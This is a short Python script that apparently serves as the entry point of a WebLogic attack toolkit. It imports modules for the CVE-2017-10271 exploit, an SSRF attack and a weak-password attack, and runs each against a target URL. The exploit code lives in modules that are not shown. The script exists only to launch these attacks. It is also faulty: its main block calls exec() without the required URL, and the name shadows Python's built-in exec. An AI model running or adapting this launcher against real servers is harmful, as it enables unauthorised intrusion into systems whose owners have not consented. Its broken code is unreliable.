# -*- coding: utf-8 -*-
import weblogic.CVE_2017_10271
import weblogic.ssrf
import weblogic.weblogic_weakpasswd

def exec(URL):
    weblogic.CVE_2017_10271.attack(URL)
    weblogic.ssrf.attack(URL)
    weblogic.weblogic_weakpasswd.attack(URL)




if __name__ == "__main__":
    exec()
